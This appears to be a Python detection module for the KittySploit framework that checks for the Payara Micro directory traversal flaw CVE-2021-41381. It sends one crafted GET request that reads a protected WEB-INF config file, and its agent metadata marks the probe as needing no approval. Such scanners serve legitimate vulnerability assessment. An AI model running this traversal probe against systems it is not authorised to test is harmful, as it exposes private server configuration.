#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Payara Micro Community 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Payara Micro Community 5.2021.6 Directory Traversal Detection',
        'description': 'Payara Micro Community 5.2021.6 and below contains a directory traversal vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'payara', 'lfi', 'packetstorm', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2021-054.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-41381',
            'https://www.payara.fish',
            'http://packetstormsecurity.com/files/164365/Payara-Micro-Community-5.2021.6-Directory-Traversal.html',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-41381',
    }

    def run(self):
        r = self.http_request(method="GET", path='/.//WEB-INF/classes/META-INF/microprofile-config.properties', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('payara.security.openid.default.providerURI=', 'payara.security.openid.sessionScopedConfiguration=true',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Payara Micro Community 5.2021.6 Directory Traversal detected",
                path='/.//WEB-INF/classes/META-INF/microprofile-config.properties',
            )
            return True
        return False

